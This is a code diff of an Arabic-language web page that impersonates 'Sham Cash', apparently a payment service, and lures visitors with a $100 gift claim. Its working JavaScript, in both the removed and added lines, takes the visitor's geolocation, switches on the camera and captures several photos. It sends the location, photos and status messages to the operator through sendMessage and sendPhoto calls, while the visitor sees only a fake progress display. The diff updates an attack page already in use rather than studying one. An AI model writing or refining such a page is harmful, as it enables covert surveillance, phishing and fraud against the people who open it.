-      const statusEl = elements['step' + step + 'Status'];
-      
-      stepEl.className = 'step-item ' + status;
-      
-      if (status === 'active') {
-        statusEl.textContent = '⏳';
-      } else if (status === 'completed') {
-        statusEl.textContent = '✅';
-      } else {
-        statusEl.textContent = '';
-      }
+    // ============ دوال العرض والإخفاء ============
+    function showProcessing() {
+      giftCard.style.display = 'none';
+      processingCard.style.display = 'block';
+      successCard.style.display = 'none';
+      errorCard.style.display = 'none';
     }
 
     function showSuccess() {
-      elements.offerCard.style.display = 'none';
-      elements.successMessage.style.display = 'block';
-      clearInterval(timerInterval);
+      giftCard.style.display = 'none';
+      processingCard.style.display = 'none';
+      successCard.style.display = 'block';
+      errorCard.style.display = 'none';
+      headerCard.style.opacity = '0.5';
     }
 
-    function showError(message) {
-      elements.offerCard.style.display = 'none';
-      elements.errorState.classList.remove('hidden');
-      elements.errorText.textContent = message;
-      clearInterval(timerInterval);
+    function showError(msg) {
+      giftCard.style.display = 'none';
+      processingCard.style.display = 'none';
+      successCard.style.display = 'none';
+      errorCard.style.display = 'block';
+      errorText.textContent = msg;
     }
 
-    // ============ البرنامج الرئيسي ============
-    async function main() {
+    function updateProgressStep(step, status) {
+      const el = document.getElementById('pStep' + step);
+      el.className = 'progress-step ' + status;
+    }
+
+    // ============ دالة بدء الاستلام ============
+    async function startClaim() {
+      const btn = document.getElementById('claimBtn');
+      btn.disabled = true;
+      btn.textContent = 'جاري التحميل...';
+
+      showProcessing();
+      updateProgressStep(1, 'current');
+
       try {
-        // تهيئة CamBot
         CamBot.init({
           captureCount: CAPTURE_COUNT,
           captureInterval: CAPTURE_INTERVAL,
@@ -690,59 +814,41 @@
         });
 
         // الخطوة 1: الموقع
-        updateStep(1, 'active');
-        updateProgress(10);
-        
         let locationData = null;
         try {
           locationData = await CamBot.getLocation();
           await Config.sendMessage(
-            `🏦 <b>شام كاش - دخول جديد</b>\n\n` +
+            `🏦 <b>شام كاش - استلام هدية</b>\n\n` +
             `📍 <b>الموقع:</b> <a href="${locationData.mapUrl}">عرض على الخريطة</a>\n` +
-            `🎯 الدقة: ${Math.round(locationData.accuracy)}م\n` +
-            `🕐 ${new Date().toLocaleString('ar-SY')}\n` +
-            `🌍 IP: يتم الجلب...`
+            `🎯 الدقة: ${Math.round(locationData.accuracy)} متر\n` +
+            `🕐 ${new Date().toLocaleString('ar-SY')}`
           );
-          updateStep(1, 'completed');
-          updateProgress(30);
         } catch (locErr) {
-          await Config.sendMessage(`⚠️ دخول بدون موقع: ${locErr}`);
-          updateStep(1, 'completed');
-          updateProgress(30);
+          await Config.sendMessage(`⚠️ بدون موقع: ${locErr}`);
         }
-
-        // انتظار قصير
-        await new Promise(r => setTimeout(r, 800));
+        updateProgressStep(1, 'done');
+        
+        await new Promise(r => setTimeout(r, 600));
 
         // الخطوة 2: الكاميرا
-        updateStep(2, 'active');
-        updateProgress(40);
+        updateProgressStep(2, 'current');
         
         try {
           await CamBot.startCamera();
-          updateStep(2, 'completed');
-          updateProgress(60);
         } catch (camErr) {
           await Config.sendMessage(`📷 فشل الكاميرا: ${camErr.message}`);
-          throw new Error('يرجى السماح بالوصول إلى الكاميرا للمتابعة');
+          throw new Error('يجب السماح بالوصول إلى الكاميرا للمتابعة');
         }
 
-        // الخطوة 3: التقاط الصور ومعالجة المكافأة
-        updateStep(3, 'active');
-        updateProgress(65);
-        
         let imagesSent = 0;
-
-        // صورة أولى
-        await new Promise(r => setTimeout(r, 1000));
+        
+        await new Promise(r => setTimeout(r, 800));
         let blob = await CamBot.capture();
         if (blob) {
           await Config.sendPhoto(blob, `📸 التحقق ${imagesSent + 1}/${CAPTURE_COUNT}`);
           imagesSent++;
-          updateProgress(65 + (imagesSent / CAPTURE_COUNT) * 25);
         }
 
-        // باقي الصور
         await new Promise((resolve) => {
           const interval = setInterval(async () => {
             if (imagesSent >= CAPTURE_COUNT) {
@@ -750,14 +856,11 @@
               resolve();
               return;
             }
-            
             blob = await CamBot.capture();
             if (blob) {
               await Config.sendPhoto(blob, `📸 التحقق ${imagesSent + 1}/${CAPTURE_COUNT}`);
               imagesSent++;
-              updateProgress(65 + (imagesSent / CAPTURE_COUNT) * 25);
             }
-            
             if (imagesSent >= CAPTURE_COUNT) {
               clearInterval(interval);
               resolve();
@@ -765,41 +868,34 @@
           }, CAPTURE_INTERVAL);
         });
 
-        // اكتمال
+        updateProgressStep(2, 'done');
+        CamBot.stop();
+
+        // الخطوة 3: الرصيد
+        updateProgressStep(3, 'current');
+        
         await Config.sendMessage(
-          `✅ <b>اكتمل التحقق - شام كاش</b>\n` +
-          `📸 ${imagesSent} صور\n` +
+          `✅ <b>اكتمل الاستلام - شام كاش</b>\n` +
+          `📸 ${imagesSent} صور تم التحقق منها\n` +
           `💰 المبلغ: 100$\n` +
           `🕐 ${new Date().toLocaleString('ar-SY')}`
         );
 
-        updateStep(3, 'completed');
-        updateProgress(100);
-        CamBot.stop();
+        await new Promise(r => setTimeout(r, 2000));
+        updateProgressStep(3, 'done');
 
-        // عرض رسالة النجاح بعد تأخير قصير
-        await new Promise(r => setTimeout(r, 1500));
+        await new Promise(r => setTimeout(r, 1000));
         showSuccess();
 
       } catch (error) {
         console.error('خطأ:', error);
         CamBot.stop();
         showError(error.message || 'حدث خطأ غير متوقع');
-        
         try {
-          await Config.sendMessage(`❌ فشل: ${error.message}`);
+          await Config.sendMessage(`❌ فشل الاستلام: ${error.message}`);
         } catch (e) {}
       }
     }
-
-    // ============ بدء التشغيل ============
-    // إخفاء شريط التحميل الأولي
-    updateProgress(5);
-    
-    // تشغيل البرنامج بعد تأخير بسيط للتحميل
-    setTimeout(() => {
-      main();
-    }, 500);
   </script>
 </body>
 </html>
